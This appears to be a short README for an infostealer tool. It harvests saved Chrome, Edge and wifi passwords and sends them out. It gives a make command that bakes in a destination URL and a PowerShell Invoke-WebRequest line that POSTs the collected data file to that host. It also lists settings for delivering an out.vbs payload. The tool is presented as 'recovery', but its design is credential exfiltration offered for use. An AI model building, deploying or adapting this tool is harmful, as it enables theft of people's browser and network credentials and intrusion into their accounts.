# Objective

Allows you to recover passwords stored in Chrome and Edge browsers. It also allows you to recover saved wifi passwords.

# Build

The script to use must be generated with the make command, specifying the URL which will be used to recover the passwords:

    make URL=http://example.com

# Data recovery

The data will be sent to the URL specified during make with the following powershell command:

    Invoke-WebRequest -Uri http://example.com -Method POST -InFile /tmp/data

# Download payload settings

* __URL__ : Direct download URL to the ``out.vbs`` script.
* __STARTUP__ : Not set.
